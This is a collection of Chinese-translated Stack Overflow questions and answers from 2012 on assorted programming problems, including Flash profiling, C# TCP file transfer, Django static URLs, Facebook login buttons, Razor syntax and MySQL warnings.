Flash Builder (4.6) 分析器显示我的应用程序的当前内存使用量约为 24000k（如果我没记错的话，是 24MB），这根本不可能。但是，活动对象视图显示，例如，内存消耗最高的对象（80 个活动实例）消耗 119000 字节，即总内存消耗的 10%。

现在总计不到 24MB，是吗？有人可以向我解释分析器如何计算内存消耗吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-10T14:20:10.393

使用 Profiler，默认情况下有过滤器，其中包括从显示中隐藏某些 Flash 和 Flex 类。确保您已删除所有过滤器。

如对主要问题的评论中所述，在这种情况下，您没有删除 flash.display 的过滤器；这意味着这些类未显示在您的类列表中，但它们的内存使用量仍计入内存使用量。

# c# - 发送二进制文件 TcpClient - 文件大于源

> ID：11396454
> 
> 赞同：4
> 
> 时间：2012-07-09T13:54:15.240
> 
> 标签：c#, .net, tcpclient, tcplistener

为了涉足网络编程，我编写了一个小控制台应用程序来将 png 文件发送到服务器（另一个控制台应用程序）。服务器正在写入的文件比源 png 文件略大。它不会打开。

客户端应用程序的代码是：

```
 private static void SendFile()
    {
        using (TcpClient tcpClient = new TcpClient("localhost", 6576))
        {
            using (NetworkStream networkStream = tcpClient.GetStream())
            {
                //FileStream fileStream = File.Open(@"E:\carry on baggage.PNG", FileMode.Open);

                byte[] dataToSend = File.ReadAllBytes(@"E:\carry on baggage.PNG");

                networkStream.Write(dataToSend, 0, dataToSend.Length);
                networkStream.Flush();

            }
        }

    } 
```

服务器应用程序的代码是：

```
 private static void Main(string[] args)
    {
        Thread thread = new Thread(new ThreadStart(Listen));
        thread.Start();

        Console.WriteLine("Listening...");
        Console.ReadLine();
    }

    private static void Listen()
    {
        IPAddress localAddress = IPAddress.Parse("127.0.0.1");
        int port = 6576;
        TcpListener tcpListener = new TcpListener(localAddress, port);
        tcpListener.Start();

        using (TcpClient tcpClient = tcpListener.AcceptTcpClient())
        {
            using (NetworkStream networkStream = tcpClient.GetStream())
            {
                using (Stream stream = new FileStream(@"D:\carry on baggage.PNG", FileMode.Create, FileAccess.ReadWrite))
                {
                    // Buffer for reading data
                    Byte[] bytes = new Byte[1024];
                    var data = new List<byte>();

                    int length;

                    while ((length = networkStream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        var copy = new byte[length];
                        Array.Copy(bytes, 0, copy, 0, length);
                        data.AddRange(copy);
                    }

                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    stream.Position = 0;
                    binaryFormatter.Serialize(stream, data.ToArray());
                }
            }

        }
        tcpListener.Stop(); 
```

写入文件的大小为 24,103Kb，而源文件只有 24,079Kb。

任何人都清楚为什么此操作失败了吗？

干杯

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T14:15:51.817

您正在使用 BinaryFormatter 编写输出。我很确定这将在输出的开头添加一些字节以指示您正在输出的类型（在本例中为 System.Byte []）。
只需将字节直接写入文件而不使用格式化程序：

```
using (Stream stream = new FileStream(@"D:\carry on baggage.PNG", FileMode.Create, FileAccess.ReadWrite))
{
    // Buffer for reading data
    Byte[] bytes = new Byte[1024];

    int length;

    while ((length = networkStream.Read(bytes, 0, bytes.Length)) != 0)
    {
        stream.Write(bytes, 0, length);
    }
} 
```

# iphone - 如何在 Objective-C 中输出 JSON 数据

> ID：11396455
> 
> 赞同：2
> 
> 时间：2012-07-09T13:54:25.590
> 
> 标签：iphone, objective-c, json

我目前正在开发一个从以下来源获取数据的 iPhone 应用程序：

我试图弄清楚如何在文本字段中将其解析为人类可读的格式。

到目前为止，我的代码是：

```
#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
    NSString *urlString = [NSString stringWithFormat:@"http://dev.threesixtyapp.com/api/events.php?action=available&id=1"];
    NSURL *url =[NSURL URLWithString:urlString];
    NSData *data = [NSData dataWithContentsOfURL:url];
    NSError  *error;
    NSMutableDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error];
    NSLog(@"%@",json);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:59:16.183

[http://stig.github.com/json-framework/](http://stig.github.com/json-framework/) - SBJson 是一个很棒的 JSON 编码/解码框架。我建议您检查一下...它将为您解析为 NSDictionary，您只需将文本字段的文本设置为您想要的 NSDictionary 中的值。使用这个框架非常简单。顺便说一句，当您将 Json 传递给 SBJson 函数时，您的 Json 应该只是一个字符串

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T15:19:45.520

首先你要了解你的json的数据结构。
您可以使用[JSON Viewer](http://jsonviewer.stack.hu/)查看 json 的数据结构。
正如我所看到的，您正在获取由和组成`event_title`的对象数组。`date_from``date_to`

```
NSError *error = nil;
NSArray *jsonArry = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error];
NSLog(@"%@",jsonArry);
for (NSDictionary *dict in jsonArry) {
    NSString * title = [dict objectForKey:@"event_title"];
    NSString * dateTo = [dict objectForKey:@"date_to"];
    NSString * dateFrom = [dict objectForKey:@"date_from"]; 
    NSLog(@"title=%@,dateTo=%@,dateFrom=%@",title,dateTo,dateFrom);
} 
```

# python - 如何使 STATIC_URL 在外部 JS 文件（Django）中工作

> ID：11396457
> 
> 赞同：2
> 
> 时间：2012-07-09T13:54:46.880
> 
> 标签：python, django, django-templates, django-staticfiles, django-static

我正在尝试在外部 javascript 文件中使用 STATIC_URL。我期待结果，因为它在模板中工作，但我发现它在外部 Javascript 文件中不起作用。

还请告诉我一些解决方法以使 STATIC_URL 在 javascript 文件中工作，因为它会使我的项目更易于管理。

此外，我正在发送许多 ajax 请求，并且我想在我的 JS 文件中有类似 url 模板标签的东西。

如果您知道其中任何一个的解决方案，请告诉我。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:06:27.453

我对这个问题的解决方案是在某个时候传递`STATIC_URL`给您的 JavaScript 代码，以便它也知道值。像这样的东西：

```
<script type="text/javascript">
myJavaScript('{{ STATIC_URL }}');
</script> 
```

然后，您的 JavaScript 函数`myJavaScript`可以在 URL 和任何需要的地方使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-10T18:28:57.060

我使用一个简单的 Django 应用程序来使 Python / Django 设置在 javascript 中可用。

[https://github.com/incuna/django-settingsjs](https://github.com/incuna/django-settingsjs)

它通过在模板中呈现设置以相同的方式工作，但提供了一种机制，可以使用视图、url 和可选的信号在 JavaScript 中提供多个变量。

# firefox - 从父窗口到子窗口的Javascript getElementById

> ID：11396458
> 
> 赞同：1
> 
> 时间：2012-07-09T13:54:49.753
> 
> 标签：firefox, google-chrome, parent, getelementbyid

您好，感谢您阅读我的帖子。

这是我基本上想做的事情：

*   在第一个 HTML 页面（“parent.html”）中，有一个按钮；

*   当用户单击按钮时，会弹出一个新窗口（“child.html”）

*   并且子窗口中“div”元素的内容被更新。

最后的动作在“Firefox”和“Chrome”下都不成功。

**父.html**

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Parent window document</title>
  </head>
  <body>
    <input 
     type="button" 
     value="Open child window document" 
     onclick="openChildWindow()" />

    <script type="text/javascript">
    function openChildWindow()
    {
      var s_url     = "http://localhost:8080/projectroot/child.html";
      var s_name    = "ChildWindowDocument";
      var s_specs   = "resizable=yes,scrollbars=yes,toolbar=0,status=0";
      var childWnd  = window.open(s_url, s_name, s_specs);
      var div       = childWnd.document.getElementById("child_wnd_doc_div_id");
      div.innerHTML = "Hello from parent wnd";
    }
    </script>
  </body>
</html> 
```

**child.html**

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Parent window document</title>
  </head>
  <body>
    <div id="child_wnd_doc_div_id">child window</div>
  </body>
</html> 
```

*   IE9 => 它有效。

*   Firefox 13.0.1 => 它不起作用。错误消息：“div 为空”。

*   Chrome 20.0.1132.47 m => 不起作用。

你理解这种行为吗？

你能帮我让它在这三种情况下工作吗？

感谢你并致以真诚的问候。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T15:09:04.373

我认为在您尝试从中访问元素时未加载窗口/文档。你可以做类似的事情

```
childWnd.onload = function() {
    var div       = childWnd.document.getElementById("child_wnd_doc_div_id");
    div.innerHTML = "Hello from parent wnd";
} 
```

您也可以查看[mdn doc](https://developer.mozilla.org/en/Working_with_windows_in_chrome_code#section_4)。

* * *

解决问题的更好方法可能是对“孩子”进行更改。您可以使用 访问父窗口`window.opener`。但是您应该记住，父窗口可能会关闭，因此您应该考虑某种类型的本地存储（例如 cookie）。

# jquery - jQuery AJAX 问题 IE8

> ID：11396461
> 
> 赞同：1
> 
> 时间：2012-07-09T13:55:06.243
> 
> 标签：jquery, internet-explorer-8

我有以下代码可以在除 IE8 之外的所有主要浏览器中完美运行。

```
 $.ajax({
        type: 'GET',
        url: 'https://APPSECRET:APPKEY@my.site.com/admin/products.json',
        cache: false, 
        timeout: 15000,
        success: function(jsonp, status, XMLHttpReq){
            callback(jsonp);
        },
        error: function(){
            alert('Error');
        },
        dataType: 'jsonp'
    }); 
```

当我在 IE 8 中运行它时，会触发错误功能并收到警报。我在这里查找了其他解决方案，甚至将缓存设置为 false 仍然不起作用。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T03:50:41.560

```
$.ajaxSetup({ cache: false }); 
```

或者

```
$.ajax({
  cache: false,
  //other options...
}); 
```

或者

将时间戳附加到查询字符串

我认为这个问题与[https://stackoverflow.com/a/4303862/169469重复](https://stackoverflow.com/a/4303862/169469)

# ruby-on-rails-3 - 检查属性是否被验证

> ID：11396463
> 
> 赞同：1
> 
> 时间：2012-07-09T13:55:10.723
> 
> 标签：ruby-on-rails-3, validation

我的问题如下：

我有一个表单视图，需要在提交后显示成功和失败图标。在提交之前只需要显示没有成功和失败图标的表单。

当这是以下形式时，我们可以通过多种方式做到这一点：

```
<%= form_for @resource do |f| %>
    <div class='<%= set_class @resource, :name %>'>
        Name: <%= f.text_field :name %>
    </div>
<% end %> 
```

检查请求是否为 POST：

```
 def set_class( record, attribute )
        if request.post?
            if record.errors[attribute].any?
                return "FAILED"
            else
                return "SUCCESS"
            end
        end
        # If not submitted, we don't want a class
    end 
```

验证后设置一个标志（我们可以`request.post?`在上面的解决方案中替换为`record.tried_to_validate`）：

```
 class MyModel < ActiveRecord::Base

        after_validation :set_tried_to_validate

        attr_accessor :validated

        def set_validated
            @tried_to_validate = true
        end

    end 
```

但我真的不喜欢这些解决方案..

没有内部 Rails 方法来检查验证过程是否完成？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:14:00.897

您可以先测试有效性..

```
@form.valid? 
```

这将生成存储在@form 上的“错误”中的错误。要查看特定字段是否存在错误，

```
@form.errors[:some_field] 
```

在您的表格上，您可以简单地执行以下操作：

```
<% if @form.errors[:some_field].empty? %>
  Valid
<% end %> 
```

只要某些字段产生错误，整个表单将是 !valid?，因此您将恢复为再次显示表单 (:new)，并且您可以应该“有效”或复选标记。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:45:17.967

I think you are looking for something like client side validations, if want the validation to show inline on the form. [http://railscasts.com/episodes/263-client-side-validations](http://railscasts.com/episodes/263-client-side-validations)

EDIT

If you want to capture the 3 stages, you can save in your db. New, Validate, Finished and just use callbacks to save each stage and set the default to new. (You will have the change the data type of the validated attribute to string)

after_validation update attribute to "validate"

after_save update attribute to "Finished"

Then you can use an if elsif else conditions to check for the value of that attribute and render the tick and cross. Obviously, this isn't pretty and you should just use valid? and the errors? helpers.

# oracle - jpa 将 varchars 标识为 BLOB？

> ID：11396465
> 
> 赞同：1
> 
> 时间：2012-07-09T13:55:13.690
> 
> 标签：oracle, spring, jpa, openjpa

我有一个非常大但非常常见的 JPA 实体类保存字段和关系。当我尝试编译项目时，我得到了这个异常：

```
-Exception Message 
Invalid column type: getBLOB not implemented for class     oracle.jdbc.driver.T4CVarcharAccessor; nested exception is <openjpa-2.2.0-r422266:1244990     fatal general error> org.apache.openjpa.persistence.PersistenceException: Invalid column type: getBLOB not implemented for class oracle.jdbc.driver.T4CVarcharAccessor FailedObject: com.transoftinc.vlm.carrierweb.domain.oc.Depot-SOMEDEPOT [java.lang.String] 
```

--update-- 这里`SOMEDEPOT`实际上是`name`Depot 实体的字段值

```
@Column(name = "D_NAME")
private String name; 
```

从异常看来，字段或关系之一被标识为 BLOB，这不是真实的。所以请给我一个任何人以前经历过的提示。谢谢你。

顺便说一句，我正在使用 Spring 3.0 和 Oracle 11g 运行 OpenJPA。

# jquery - 如何根据 if else 语句更改类

> ID：11396475
> 
> 赞同：1
> 
> 时间：2012-07-09T13:55:50.283
> 
> 标签：jquery, if-statement

在我的网站的标题中，我有一个主导航，使用每个超链接项包含一个唯一的数据属性，我使用它来确定通过 load() 显示哪些内容。

我的问题是，我如何编写 if else 语句（假设这是最好的方法）来检查加载的内容与主导航。例如，加载的内容将包含一个包装好的 div，其 ID 与标题中单击的链接的数据属性的 ID 相匹配。我想要实现的是一个语句，如果它的数据属性等于加载内容的 ID，它将为主导航超链接提供唯一类。

```
<header id="header">
    <ul>
        <li><a href="external.html" data-section="intro">intro</a></li>
        <li><a href="external.html" data-section="interactive">interactive</a></li>
        <li><a href="external.html" data-section="portfolio">photography</a></li>
    </ul>
</header> 
```

例如，如果单击第一个链接，则会将 external.html 文档中的 id="intro" 的 div 加载到页面中。在这种情况下，html 将显示一个带有 data-section = "intro" 的超链接以及一个带有 id ="intro" 的 div。

我想知道如何编写一个绑定的（因为内容是通过 .load() 加载的，我假设我需要绑定语句）如果在 jquery 中使用 else 语句来提供具有数据部分值的标题导航项匹配 div 的 id 值的唯一类，即“活动”

单击第一个链接时加载的内容示例

```
<section id="intro" class="clearfix">
    <div>
        <h1>Bigger Thinking</h1>
        <h2>It’s what I aim to do on every project, big or small, rich or poor</h2>
    </div>
</section> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:03:03.120

尝试这个：

```
var id = $('section').attr('id');
$('#header a').removeClass('unique')
$('#header a[data-section="'+ id +'"]').addClass('unique') 
```

# java - i18n 在构建过程中（或将一个模板 HTML 编译为 i18n HTML）

> ID：11396476
> 
> 赞同：1
> 
> 时间：2012-07-09T13:55:50.320
> 
> 标签：java, internationalization, client-side

我正在做一个需要支持国际化的项目。我们想到的解决方案是：

1.  创建带有语言占位符的 HTML 模板（即 home.html）。
2.  创建一个 i18n 目录，其中包含以下文件：“language_en_GB.json”。
3.  在构建过程中将它们合并在一起以创建输出 HTML。输出文件将位于基于语言的目录中（例如“views/en_GB/home.html”或“views/fr_CA/home.html”）。

所以基本上是这样的：

```
<h1>{{i18n_welcome}}</h1>
<h2>{{userName}}</h2> 
```

与此合并：

```
 {
      welcome:"Welcome!"
  } 
```

在构建过程中会变成这样：

```
 <h1>Welcome!</h1>
   <h1>{{userName}}</h1> 
```

我有几个问题，并appriciate你的意见。

1.  这是 i18n 的好方法吗？
2.  您知道可以很好地处理 i18n 的模板引擎吗？
3.  是否有客户端“烘焙”的解决方案。我希望 UI 开发人员也能够在本地烘焙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:20:50.083

根据您的需求和您当前在代码中使用的内容，有几个框架支持开箱即用的 i18n。作为一个纯模板引擎，你可以看看[Velocity](http://velocity.apache.org/)或[Freemarker](http://freemarker.sourceforge.net/)。如需更完整的框架，您可以查看[Spring](http://static.springsource.org/spring/docs/3.0.x/spring-framework-reference/html/)和[Spring 示例](http://viralpatel.net/blogs/spring-3-mvc-internationalization-i18n-localization-tutorial-example/)以及[Struts](http://struts.apache.org/2.x/)和[Struts2 示例](http://www.mkyong.com/struts2/struts-2-i18n-or-localization-example/)。

当然，还有许多其他选择。我只是列出了我见过人们使用的最受欢迎的四个。

基本上，对于任何框架，您都可以为每种语言创建资源包（使用特定包的语言命名。例如：language_en_GB.properties）。所以你的思维过程非常一致。基本上你从你的 html 文件开始并包含你的占位符。在每种语言的资源包中，您指定字符串应该是什么。之后，框架会为您即时进行合并，并使用相关语言的适当资源包。

所以你几乎走在了正确的轨道上——这一切都变成了一个与你的框架正确集成并利用它来进行合并而不是在构建管道期间进行合并的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:21:28.623

您未能提供必要的详细信息，因此我无法真正回答您的问题。我只能说你的计划似乎是另一个轮子的再发明（但不像原来的那样圆）。

有一些 i18n 最佳实践。在 Java 世界中，这通常意味着使用资源包（以属性文件的形式）和一些机制（如 JSTL）在呈现页面时翻译它们。这是最好的方法，因为您不需要重新编译任何东西来引入对另一种语言的支持。

如果您关心为客户端脚本提供支持，通常通过从网页中写出一些数组并在客户端访问它来完成。我认为这是最常见的解决方案。另一个是有一些网络服务来为您提供翻译并通过 XHR（即 AJAX）阅读它，但这可能是有问题的。无论如何，您需要以某种方式将翻译从服务器端推送到客户端。
当然，您需要从资源包中读取它们。

从您所写的内容来看，您似乎想要构建某种静态网页，由应用程序服务器支持（因此静态网页编译）。如果我猜对了，老实说使用 Java 有点矫枉过正。您最好使用一些 CMS 软件，例如 Joomla、Drupal 或 jEase。

# c# - 寻找我当前方法调用的 ac# 泛型版本

> ID：11396477
> 
> 赞同：2
> 
> 时间：2012-07-09T13:55:55.260
> 
> 标签：c#, asp.net, generics

我有 2 节课：

*   员工
*   员工详情

我有这样的`Employee`类方法：

```
public static Employee LoadEmployee(int id)
{
    StringBuilder selectQuery = new StringBuilder();

    string selectQuery = " my query with the parameter 'Id' ";
    dbGenerator _db = dbGenerator.Instance.Database;

    DbCommand selectCommand = _db.GetSqlStringCommand(selectQuery.ToString());
    _db.AddInParameter(selectCommand, "@id", System.Data.DbType.String, Id);

    //EXECUTE THE COMMAND
    using (IDataReader dr = _db.ExecuteReader(selectCommand))
    {
        if (dr.Read())
        {
            result = new Employee();
            Employee.LoadDataReader(result, dr);
        }

        dr.Close();
    }

    return result;
} 
```

而且我有一个方法对`EmployeeDetails`类做同样的事情......除了返回类型之外没有任何变化。

我确信有一些方法可以最大限度地减少代码行，并且使用 C# 泛型它会更具可读性，并且泛型提供类型安全性，而不会产生多个实现的开销。

我需要一个可以传递类对象的方法`selectQuery`，`ParameterId`就像这样

```
public static <T> LoadData<T>(Object object, string selectQuery, int paramId)
{
    // do stuff 

    // return <T>results;
} 
```

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:03:43.523

最好的方法是使用某种 ORM（EntityFramework 或 NHibernate），因为这样您就可以免费获得*通用*管理。

但是，这样的事情可能会起作用：

```
public static T LoadEntity<T>(int id, StringBuilder selectQuery) where T : Entity
        {
            dbGenerator _db = dbGenerator.Instance.Database;
            DbCommand selectCommand = _db.GetSqlStringCommand(selectQuery.ToString());
            _db.AddInParameter(selectCommand, "@id", System.Data.DbType.String, Id);
            //EXECUTE THE COMMAND
            using (IDataReader dr = _db.ExecuteReader(selectCommand))
            {
                if (dr.Read())
                {
                    T result = default(T);
                    EntityContext.LoadDataReader(result, dr);
                }
                dr.Close();
            }
            return result;
        } 
```

如您所见，此解决方案要求您继承`Entity`并`Entity`包含方法`LoadDataReader`。此外，您必须传入查询。

免责声明：未经测试的代码！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:03:44.397

拥有两者`Employee`并`EmployeeDetails` 从同一接口继承，因此它们都具有 LoadDataReader 方法。

然后

```
public static T Load<T> (int id) 
    where T: IMyInterface 
```

您可能需要在您的 LoadDataReader 方法中进行一些反思或一些花哨的事情。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-09T14:04:33.903

`EmployeeDataReader`首先，为和提供一个共同点`EmployeeDetailsDataReader`。

泛型在这里帮助提供不同的返回类型。因此，您需要一个基类（或接口）来处理它。例如，`EmployeeDataReaderBase<TEmployee>`。

然后数据读取器可以从这个基类继承。

然后将您的方法更改为：

```
public static Employee LoadEmployee<TEmployee>(int id, EmployeeDataReaderBase<TEmployee> datareader) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-09T14:08:33.510

您可以将“接口继承”与`LoadDataReader`作为接口方法一起使用（假设 LoadDataReader 对于 Employee 和 EmployeeDetails 是不同的）。然后将实例传递给静态 LoadEmployee 方法；将返回类型设置为 void

```
interface IDataReader
{
   void Load(DataReader reader);
}

public class Employee : IDataReader
{
   // some code... members...

   public void Load(DataReader reader)
   {
        /// some code...
   }
}

public static void Load(IDataReader reader, int id)
{
   // lots of code...
   if (dr.Read())
   {        
        // the specific reader would create its own type within... 
        // there by keeping the instance creation with in the LoadDataReader.
        // ex: If reader's type is Employee it would create Employee and setup the object with info from the reader?
        reader.LoadDataReader(dr);

   }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-09T14:11:02.363

其他人关于只使用 ORM 的建议很好，但如果你有充分的理由从头开始做这个层，你可以修改你的设计看起来像这样：

```
public class Employee 
{
    public virtual void InitFromDataReader(DataReader dr) { }
}

public class EmployeeDetails : Employee
{
    public override void InitFromDataReader(DataReader dr) { }
}

public static TEmployee LoadEmployee<TEmployee>(int id) where TEmployee : Employee, new()
{
    using (DataReader dr = new DataReader()) 
    {
        var result = new TEmployee();
        result.InitFromDataReader(dr);
        return result;
    }
} 
```

主要限制是您需要在实体对象上具有无参数构造函数，否则`LoadEmployee`方法无法正确创建它们。也就是说，除非您明确地将工厂对象作为参数传递给该方法。

# facebook - Facebook登录按钮自定义文本还原

> ID：11396478
> 
> 赞同：6
> 
> 时间：2012-07-09T13:55:57.893
> 
> 标签：facebook, text, login

希望你能帮助我解决这个问题。

我已经从 FB 开发者网站上获取了基本的登录按钮代码，并按原样写出来：

```
<div id="fb-root"></div>

<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=345451695525893";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<div class="fb-login-button" data-show-faces="false" data-width="200" data-max-  rows="1">Test text</div> 
```

我正在做的唯一自定义是用我自己的文本（在本例中为“测试文本”）覆盖默认的“登录”文本。这在我退出 facebook 时工作正常，但有趣的是，当我登录到 facebook（通过另一个选项卡上的 facebook 站点），然后返回访问我的页面时，自定义文本闪烁，然后呈现按钮第二次使用默认的“登录”文本。

有什么想法，或者这是 Facebook 设计的功能吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-11-01T07:28:10.193

使用以下来使用您的自定义文本

```
<div class="fb-login-button" data-show-faces="false"  data-width="200" data-onlogin="afterLoginCallback()" login_text="Your Text" ></div> 
```

注意，提供了属性`login_text`来设置登录按钮上的文本。如果你不设置它，它会用 Facebook 提供的默认文本覆盖你的文本。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-07-15T19:29:41.370

鉴于最近对 fb-login-button 组件的更改（大约一周前似乎总是将自定义文本重写为“登录”），您最好的选择是为 Facebook 按钮和触发器创建一个自定义 CSS 类FB.通过 Javascript 登录。这就是我所做的，并且运行良好。

下面是 Facebook 按钮的一些 CSS，它看起来与标准 Facebook 按钮完全一样，并且很容易支持自定义文本：

```
a.fb-button {
    color: #FFF;
    display: inline-block;
    text-decoration: none;
}

.fb-button {
    background: #5F78AB;
    background-image: url('http://static.ak.fbcdn.net/rsrc.php/v2/yf/r/S-DbSHszr4D.png');  /*COPY TO YOUR OWN IMAGE STORE*/
    background-repeat: no-repeat;
    background-position: -1px -81px;
    border-top: 1px solid #29447E;
    border-right: 1px solid #29447E;
    border-bottom: 1px solid #1A356E;
    border-left: 1px solid #29447E;
    -webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1), inset 0 1px 0 #8A9CC2;
    -moz-box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1), inset 0 1px 0 #8a9cc2;
    box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1), inset 0 1px 0 #8A9CC2;
    cursor: pointer;
    font-family: 'lucida grande', tahoma, verdana, arial, sans-serif;
    font-size: 13px;
    font-weight: bold;
    height: 23px;
    line-height: 23px;
    padding: 0px 5px 0px 30px;
    text-align: left;
} 
```

您页面上的元素将是

```
<a class="fb-button" onClick="fblogin();">Custom Text</a> 
```

然后像这样的JS函数

```
var fblogin = function() {
    FB.login(function(response) {
        if (response) {
            if (response.authResponse) {
                //successful auth
                //do things like create account, redirect etc.
            } else {
                //unsuccessful auth
                //do things like notify user etc.
            }
        },{scope:'email,publish_stream'}); //whatever perms your app needs
}; 
```

当然，您需要在页面中包含 fb 根 div 并在此之前初始化 Facebook JS SDK

这是它的外观：

![带有自定义文本的 Facebook 按钮](../Images/b3a38a9213888bb84c156ee3e526bcb6.png)

CSS 很酷的一点是，您可以使用它在您的网站上创建其他 Facebook 按钮，以使用熟悉的外观和感觉来处理不受支持的内容（如分享）。您甚至可以创建一些额外的 css 以允许不同大小的按钮。您只需要为背景图像设置不同的背景位置以及不同的字体大小、高度等。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-11-21T13:51:55.463

或者你可以只使用：

```
<div class="fb-login-button" data-login_text="Connect with FaceBook"></div> 
```

或者

```
<fb:login-button show-faces="true" width="200" max-rows="1" login_text="Connect with FaceBook"></fb:login-button> 
```

像 1,2,3 一样简单 :)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-01-16T09:32:05.223

试试这个，像这样添加数据登录文本。

```
<div class="fb-login-button"
    data-login-text="Sign in with Facebook"
    data-max-rows="1"
    onlogin="window.location.reload()"
    data-size="large"
    data-show-faces="false"
    data-auto-logout-link="false">
</div> 
```

# asp.net-mvc-3 - MVC 3 剃须刀，语法错误

> ID：11396480
> 
> 赞同：2
> 
> 时间：2012-07-09T13:56:06.817
> 
> 标签：asp.net-mvc-3, razor, syntax

我怎样才能避免下一个逻辑？我有下一个代码：

```
<script type="text/javascript">
        var x = $("#myId1").val();
    @if(Model.IsOptions)
    {
     $('#myId2').click(function () { doSomething(); });
    }
</script> 
```

所以，我想执行 $('#myId2').. 仅当 'Model.IsOption' 为真时。目前 Visual Studio 将其下划线为错误代码。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T14:00:11.263

@if 中的代码应该是 C#，而不是 JavaScript。Razor 尝试在服务器上执行它，而不是在客户端上。要强制它把它当作 JavaScript，你应该使用`<text></text>`or `@:`，就像这样。

```
<script type="text/javascript">
    var x = $("#myId1").val();
    @if(Model.IsOptions)
    {
        <text>
            $('#myId2').click(function () { doSomething(); });
        </text>
    }
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T16:23:16.840

你能试一下吗：

```
@{
    if(Model.IsOptions)
    {
         $('#myId2').click(function () { doSomething(); });
    }
} 
```

它有效吗？

# mysql - MySQL：“LIMIT 5”导致警告

> ID：11396481
> 
> 赞同：6
> 
> 时间：2012-07-09T13:56:07.777
> 
> 标签：mysql, sql, warnings

我一直在 MySQL 控制台中执行以下查询：

```
INSERT INTO pixel_window 
   SELECT id 
      FROM pixels 
         WHERE pixel_id='type2' 
            ORDER BY id DESC 
               LIMIT 5; 
```

并得到：

```
Query OK, 5 rows affected, 1 warning (0.00 sec)
Records: 5  Duplicates: 0  Warnings: 0

mysql> SHOW WARNINGS\G
*************************** 1\. row ***************************
  Level: Note
   Code: 1592
Message: Statement may not be safe to log in statement format.
1 row in set (0.00 sec) 
```

我玩了一点查询，发现当`LIMIT`被省略时，警告消失了。

这个警告是什么意思？为什么`LIMIT`这个子查询有问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T14:06:33.460

它被认为是一个错误。

当您未在更新中定义“order by”子句时，可能会引发警告。在您的情况下，它被认为是安全的，因为您按 ID 订购（假设 id 是唯一的 id？）

在此处阅读有关错误报告的更多信息：http://bugs.mysql.com/bug.php?id= [42415](http://bugs.mysql.com/bug.php?id=42415)

# c# - 如何使用`PlaceHolder`代替`HtmlTableRow`或`HtmlTableCell`？

> ID：11396489
> 
> 赞同：2
> 
> 时间：2012-07-09T13:56:18.883
> 
> 标签：c#, asp.net, html

我想在 ASCX 文件中创建一个包含以下内容的用户控件：

```
...
<tr runat="server" ID="mytr">
    <td runat="server" ID="myCell1"></td>
    <asp:PlaceHolder runat="server" ID="myPlaceholder"></asp:PlaceHolder>
    <td runat="server" ID="myCell2"></td>
</tr>
... 
```

这会产生以下错误：

> System.Web.UI.HtmlControls.HtmlTableCellCollection 必须具有“System.Web.UI.HtmlControls.HtmlTableCell”类型的项目。“asp:PlaceHolder”的类型为“System.Web.UI.WebControls.PlaceHolder”。

的原因`PlaceHolder`是我想动态生成该单元格（例如在 and 之间进行选择`TD`，`TH`或者选择是否创建它。

是否有捷径可寻？或者也许我应该创建我自己的继承的自定义控件`HtmlTableCell`？

我注意到某些表格元素的视图状态由序号（子控件集合的索引）键控，这意味着我有时也无法在我期望的情况下动态生成单元格。在这方面有一些一般的最佳实践吗？

我也考虑过总是创建 TD，但只是隐藏它。问题是我`rowspan`在前一行使用，这意味着不同的行将呈现不同数量的单元格。这是有条件的，并且可以在回发之间更改（通过启用/禁用一行）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:10:08.240

You can use **ASP.net Table Webcontrol** for creating your table dynamically (if you consider of generating whole table from your code.)

